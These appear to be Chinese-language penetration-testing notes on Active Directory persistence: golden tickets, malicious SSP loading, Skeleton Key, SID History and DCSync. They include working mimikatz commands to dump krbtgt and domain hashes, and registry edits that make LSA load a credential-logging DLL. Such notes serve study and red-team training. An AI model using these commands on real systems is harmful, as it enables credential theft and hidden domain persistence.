## PTT
Pass-the-Ticket, 针对Kerberos认证协议, 获取并使用合法用户的Kerberos ticket来冒充该用户

### 黄金票据伪造
条件
- 域名称: `whoami`
- 域SID: 
	- `whoami /user`
	- `wmic useraccount list brief`
- 域的KRBTGT账户密码Hash, ntlm hash或aes-256
	- `mimikatz lsadump::dcsync /user:krbtgt@<domain_name>
	- `mimikatz lsadump::dcsync /domain:<domain_name> /all /csv`
- 伪造(任意)用户名

## SSP
`SSP`: Security Support Provider, windows身份验证的dll

`SSPI`: Interface, windows系统在执行认证操作所使用的API

`LSA`: Local Security Authority, 用于身份认证, 常见进程为`lsass.exe`, 可扩展, 在系统启动时会加载SSP到其中, 即可以自定义和修改一个dll, 会在启动时被加载

### 永久加载
用mimikatz中的`mimilib.dll`, 放到`C:\Windows\system32`目录下, 并将其添加到注册表中, 有持久化效果

**需要重启该主机才能加载dll**

```sh
copy mimilib.dll %systemroot%\system32

reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

# 替换  
reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages" /d "mimilib.d  
ll" /t REG_MULTI_SZ /f 

# 追加  
reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages" /d "kerberos  
\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
```

### 注入内存
不会在系统中留下二进制文件, 但如果域控重启, 被注入的伪造SSP会丢失
```sh
mimikatz privilege::debug  
mimikatz misc::memssp  
type C:\Windows\System32\mimilsa.log
```

## Skeleton Key
无需重启域控即可生效, Windows Server 2003 -- Windwos Server 2012 R2, 让所有域用户使用同一个万能密码登录
`misc:skeleton`

## SID History
每个用户独立, 跟踪安全主体控制用户连接资源时的访问权限
将A域中的用户迁移到B域中, SID会改变, 影响迁移后的权限
SID History在域迁移过程中保持用户的访问权限, 即系统会将原SID添加到迁移以后的用户的`SID History` 属性中, 保留其原有权限

## Dcsync
域环境中, 不同控制器间15分钟同步以此, 发起`GetNCChanges`请求, 数据包包括需要同步的数据

通过`Directory Replication Service`的`GetNCChanges`接口模仿域控, 从真实的域控中请求数据, 例如用户的哈希

可以不登陆到域控, 获取域控上的数据

获得域管理员权限后, 可以修改一个普通用户拥有DCSync权限, 来隐蔽完成权限维持, dump域哈希

域内用户的权限根据用户的DACL决定, 任意用户拥有以下三条DACL即可完成DCSync攻击请求, dump出域内用户hash: 
- 复制目录更改 (DS-Replication-Get-Changes)  
- 全部复制目录更改 (DS-Replication-Get-Changes-All)  
- 在过滤集中复制目录更改(可有可无) (DS-Replication-Get-Changes-In-Filtered-Set)

以下用户默认拥有这些权限：  
- Administrators 组内的用户  
- Domain Admins 组内的用户  
- Enterprise Admins 组内的用户  
- 域控制器的计算机帐户